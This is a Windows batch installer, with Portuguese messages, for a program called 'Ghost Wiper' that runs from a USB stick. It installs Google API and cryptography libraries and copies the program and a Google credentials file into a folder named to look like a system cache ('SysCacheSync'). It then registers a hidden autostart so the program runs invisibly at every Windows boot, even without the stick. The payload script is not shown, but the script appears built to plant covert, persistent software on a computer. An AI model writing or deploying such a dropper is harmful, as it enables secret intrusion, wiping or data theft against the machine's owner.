@echo off
chcp 65001 >nul
title Ghost - Instalacao
echo ============================================
echo   GHOST WIPER - INSTALADOR
echo ============================================
echo.

REM --- Verifica Python ---
py --version >nul 2>&1
if errorlevel 1 (
    echo [ERRO] Python nao encontrado!
    echo Baixe em: https://www.python.org/downloads/
    pause
    exit /b 1
)

echo [1/4] Instalando bibliotecas (pode demorar na 1a vez)...
py -m pip install --quiet google-api-python-client google-auth-httplib2 google-auth-oauthlib cryptography
if errorlevel 1 (
    echo [ERRO] Falha ao instalar bibliotecas.
    pause
    exit /b 1
)
echo       OK!

REM --- Verifica credentials.json no pendrive ---
if not exist "%~dp0credentials.json" (
    echo [ERRO] credentials.json nao encontrado na pasta!
    pause
    exit /b 1
)
echo [2/4] credentials.json encontrado. OK!

REM --- Copia os arquivos para o PC (funciona sem o pendrive) ---
set "DESTINO=%LOCALAPPDATA%\SysCacheSync\app"
mkdir "%DESTINO%" 2>nul
copy /y "%~dp0ghost_wiper.pyw" "%DESTINO%\" >nul
copy /y "%~dp0credentials.json" "%DESTINO%\" >nul
if exist "%~dp0config.json" copy /y "%~dp0config.json" "%DESTINO%\" >nul
echo [3/4] Arquivos copiados para o PC. OK!

REM --- Registra tarefa agendada apontando para a copia local ---
echo [4/4] Registrando inicio automatico oculto...
py "%DESTINO%\ghost_wiper.pyw" --instalar
if errorlevel 1 (
    echo [ERRO] Falha ao registrar tarefa.
    pause
    exit /b 1
)

echo.
echo ============================================
echo   INSTALADO COM SUCESSO!
echo   - Inicia junto com o Windows, invisivel
echo   - Funciona SEM o pendrive plugado
echo   - Dados ocultos em %%LOCALAPPDATA%%\SysCacheSync
echo ============================================
echo.
echo Quer INICIAR AGORA em modo visivel (teste)?
choice /c SN /m "S=Sim N= nao"
if errorlevel 2 goto fim
start "" py "%DESTINO%\ghost_wiper.pyw"
:fim
pause
